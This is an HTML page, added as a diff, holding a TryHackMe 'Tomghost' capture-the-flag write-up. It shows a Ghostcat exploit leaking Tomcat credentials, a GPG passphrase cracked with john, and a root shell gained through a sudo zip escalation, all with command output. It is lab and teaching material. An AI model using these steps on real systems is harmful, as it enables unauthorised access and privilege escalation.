@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>0xb0tm4n&#x27;s website</title>
+  <script src="https://cdn.jsdelivr.net/npm/js-cookie@3.0.5/dist/js.cookie.min.js"
+    integrity="sha256-WCzAhd2P6gRJF9Hv3oOOd+hFJi/QJbv+Azn4CGB8gfY=" crossorigin="anonymous" defer></script>
+  <script src="/js/index.js" defer></script>
+  <script src="/js/prompt.js" defer></script>
+  <script src="/js/keyboard.js" defer></script>
+  <script src="/js/tab.js" defer></script>
+  <script src="/js/commands.js" defer></script>
+  <script src="/js/config.js" defer></script><link rel="stylesheet" href="/css/base.css"><link rel="stylesheet" href="/css/page.css"></head><body onkeydown='exec(event)' style='background-image: url("/assets/background.jpg");'><main>
+      <div class="files" id="files" tabindex="0">
+<ul>
+  <li class="file">
+    <span><a href='https://super-botman.github.io/readme/'
+      tabindex="0">  README</a></span>
+  </li>
+
+<li class="folder"><span>
+      <a href='https://super-botman.github.io/pwn/'
+        tabindex="0">  Pwn
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/pwn/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/robot/'
+        tabindex="0">  FCSC 2023 | Robot</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/bigorneau/'
+        tabindex="0">  FCSC 2025 | Bigorneau</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/http3/'
+        tabindex="0">  FCSC 2025 | HTTP3</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/small-prime-shellcode/'
+        tabindex="0">  FCSC 2025 | Small Prime Shellcode</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/aarchibald/'
+        tabindex="0">  Hackropole | Aarchibald</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/alfred/'
+        tabindex="0">  Hackropole | Alfred</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/armigo/'
+        tabindex="0">  Hackropole | Armigo</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/pwn/writeups/pwn103/'
+        tabindex="0">  THM | pwn101 task 103</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li><li class="folder"><span>
+      <a href='https://super-botman.github.io/web/'
+        tabindex="0">  Web
+      </a>
+    </span>
+
+    <ul>
+      
+      
+        
+        
+          
+<li>
+<span>└──
+  <a href='https://super-botman.github.io/web/writeups/'
+    tabindex="0">  Writeups
+  </a>
+</span>
+
+
+  <ul>
+
+  
+  <li class="file">
+    <span>└──
+      <a href='https://super-botman.github.io/web/writeups/boiler/'
+        tabindex="0">  THM | Boiler</a>
+    </span>
+  </li><li class="file">
+    <span>└──
+      <a class="selected"href='https://super-botman.github.io/web/writeups/thomghost/'
+        tabindex="0">  THM | Thomghost</a>
+    </span>
+  </li></ul>
+</li>
+
+        
+    </ul>
+  </li>
+</ul>
+</div>
+      <div class="viewer page" id="viewer" tabindex="0">
+        <div class="tab">
+<div class="file-manager" onclick='document.getElementById("files").classList.toggle("open"); document.getElementById("content").classList.toggle("close")'> </div>
+<ul id="tabs">
+</ul>
+
+
+</div>
+        <div class="content" id="content"><h1 id="thm-thomghost-writeup">THM Thomghost writeup</h1>
+<h2 id="8009-tomcat">8009 : tomcat</h2>
+<p>use exploit <code>48143.py</code> from <a href="https://exploit-db.com">exploit db</a> and get :</p>
+<pre data-lang="xml" style="background-color:#1a1b26;color:#c0caf5;" class="language-xml "><code class="language-xml" data-lang="xml"><span>Getting resource at ajp13://10.10.228.43:8009/asdf
+</span><span>----------------------------
+</span><span style="color:#89ddff;">&lt;?</span><span style="color:#f7768e;">xml </span><span style="color:#bb9af7;">version</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">1.0</span><span style="color:#89ddff;">&quot; </span><span style="color:#bb9af7;">encoding</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">UTF-8</span><span style="color:#89ddff;">&quot;?&gt;
+</span><span style="font-style:italic;color:#565f89;">&lt;!--
+</span><span style="font-style:italic;color:#565f89;"> Licensed to the Apache Software Foundation (ASF) under one or more
+</span><span style="font-style:italic;color:#565f89;">  contributor license agreements.  See the NOTICE file distributed with
+</span><span style="font-style:italic;color:#565f89;">  this work for additional information regarding copyright ownership.
+</span><span style="font-style:italic;color:#565f89;">  The ASF licenses this file to You under the Apache License, Version 2.0
+</span><span style="font-style:italic;color:#565f89;">  (the &quot;License&quot;); you may not use this file except in compliance with
+</span><span style="font-style:italic;color:#565f89;">  the License.  You may obtain a copy of the License at
+</span><span style="font-style:italic;color:#565f89;">
+</span><span style="font-style:italic;color:#565f89;">      http://www.apache.org/licenses/LICENSE-2.0
+</span><span style="font-style:italic;color:#565f89;">
+</span><span style="font-style:italic;color:#565f89;">  Unless required by applicable law or agreed to in writing, software
+</span><span style="font-style:italic;color:#565f89;">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,
+</span><span style="font-style:italic;color:#565f89;">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+</span><span style="font-style:italic;color:#565f89;">  See the License for the specific language governing permissions and
+</span><span style="font-style:italic;color:#565f89;">  limitations under the License.
+</span><span style="font-style:italic;color:#565f89;">--&gt;
+</span><span style="color:#89ddff;">&lt;</span><span style="color:#f7768e;">web-app </span><span style="color:#bb9af7;">xmlns</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">http://xmlns.jcp.org/xml/ns/javaee</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#f7768e;">  </span><span style="color:#bb9af7;">xmlns</span><span style="color:#89ddff;">:</span><span style="color:#bb9af7;">xsi</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">http://www.w3.org/2001/XMLSchema-instance</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#f7768e;">  </span><span style="color:#bb9af7;">xsi</span><span style="color:#89ddff;">:</span><span style="color:#bb9af7;">schemaLocation</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">http://xmlns.jcp.org/xml/ns/javaee
+</span><span style="color:#9ece6a;">                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#f7768e;">  </span><span style="color:#bb9af7;">version</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">4.0</span><span style="color:#89ddff;">&quot;
+</span><span style="color:#f7768e;">  </span><span style="color:#bb9af7;">metadata-complete</span><span style="color:#89ddff;">=&quot;</span><span style="color:#9ece6a;">true</span><span style="color:#89ddff;">&quot;&gt;
+</span><span>
+</span><span>  </span><span style="color:#89ddff;">&lt;</span><span style="color:#f7768e;">display-name</span><span style="color:#89ddff;">&gt;</span><span>Welcome to Tomcat</span><span style="color:#89ddff;">&lt;/</span><span style="color:#f7768e;">display-name</span><span style="color:#89ddff;">&gt;
+</span><span>  </span><span style="color:#89ddff;">&lt;</span><span style="color:#f7768e;">description</span><span style="color:#89ddff;">&gt;
+</span><span>     Welcome to GhostCat
+</span><span>	   skyfuck:passwd
+</span><span>  </span><span style="color:#89ddff;">&lt;/</span><span style="color:#f7768e;">description</span><span style="color:#89ddff;">&gt;
+</span><span>
+</span><span style="color:#89ddff;">&lt;/</span><span style="color:#f7768e;">web-app</span><span style="color:#89ddff;">&gt;
+</span></code></pre>
+<h2 id="22-ssh">22 : ssh</h2>
+<p>login using creds <code>ssh skyfuck@$IP</code> then it's the <code>privesc</code> parts :</p>
+<h3 id="privesc">privesc:</h3>
+<p>find two files : <code>credential.gpg</code> and <code>tryhackme.asc</code> then use john for decrypt the password of the gpg key :</p>
+<pre data-lang="bash" style="background-color:#1a1b26;color:#c0caf5;" class="language-bash "><code class="language-bash" data-lang="bash"><span style="color:#7aa2f7;">gpg2john tryhackme.asc </span><span style="color:#89ddff;">&gt;</span><span style="color:#7aa2f7;"> key.hash
+</span><span style="color:#7aa2f7;">john</span><span style="color:#89ddff;"> -</span><span style="color:#e0af68;">wordlist</span><span style="color:#89ddff;">=</span><span style="color:#7aa2f7;">/usr/share/wordlists/rockyou.txt key.hash
+</span></code></pre>
+<p>the use gpg to decrypt the file <code>credential.gpg</code> :</p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
+</span><span>└─$ gpg --import private.key       
+</span><span>gpg: clef 8F3DA3DEC6707170 : « tryhackme &lt;stuxnet@tryhackme.com&gt; » n&#39;est pas modifiée
+</span><span>gpg: clef 8F3DA3DEC6707170 : clef secrète importée
+</span><span>gpg: clef 8F3DA3DEC6707170 : « tryhackme &lt;stuxnet@tryhackme.com&gt; » n&#39;est pas modifiée
+</span><span>gpg:       Quantité totale traitée : 2
+</span><span>gpg:                 non modifiées : 2
+</span><span>gpg:           clefs secrètes lues : 1
+</span><span>gpg:      clefs secrètes importées : 1
+</span><span>                                                                                                                                                                        
+</span><span>┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
+</span><span>└─$ gpg --decrypt credential.pgp
+</span><span>gpg: Attention : l&#39;algorithme de chiffrement CAST5 est introuvable
+</span><span>            dans les préférences du destinataire
+</span><span>gpg: chiffré avec une clef ELG de 1024 bits, identifiant 61E104A66184FBCC, créée le 2020-03-11
+</span><span>      « tryhackme &lt;stuxnet@tryhackme.com&gt; »
+</span><span>merlin:&lt;passwd&gt;
+</span></code></pre>
+<p>and login to ssh:</p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>┌──(ismael㉿kali)-[~/Documents/CTF/THM/tomghost]
+</span><span>└─$ ssh merlin@10.10.126.249
+</span><span>merlin@10.10.126.249&#39;s password: 
+</span><span>Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-174-generic x86_64)
+</span><span>
+</span><span> * Documentation:  https://help.ubuntu.com
+</span><span> * Management:     https://landscape.canonical.com
+</span><span> * Support:        https://ubuntu.com/advantage
+</span><span>
+</span><span>Last login: Sat Aug  6 06:52:00 2022 from 10.9.2.76
+</span><span>merlin@ubuntu:~$ cat flag.txt
+</span><span>&lt;flag&gt;
+</span></code></pre>
+<p>so now it's privesc time !</p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>merlin@ubuntu:~$ id
+</span><span>uid=1000(merlin) gid=1000(merlin) groups=1000(merlin),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
+</span><span>merlin@ubuntu:~$ sudo -l
+</span><span>Matching Defaults entries for merlin on ubuntu:
+</span><span>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+</span><span>
+</span><span>User merlin may run the following commands on ubuntu:
+</span><span>    (root : root) NOPASSWD: /usr/bin/zip
+</span></code></pre>
+<p>go to <a href="https://gtfobins.github.io/gtfobins/">GTFOBins</a> and search zip : <a href="https://gtfobins.github.io/gtfobins/zip/#sudo">zip#sudo</a></p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span>merlin@ubuntu:~$ TF=$(mktemp -u)
+</span><span>merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT &#39;sh #&#39;
+</span><span>  adding: etc/hosts (deflated 31%)
+</span><span># id
+</span><span>uid=0(root) gid=0(root) groups=0(root)
+</span></code></pre>
+<p>and get the second flag:</p>
+<pre style="background-color:#1a1b26;color:#c0caf5;"><code><span># cd /root
+</span><span># ls
+</span><span>root.txt  ufw
+</span><span># cat root.txt
+</span><span>&lt;flag&gt;
+</span></code></pre>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
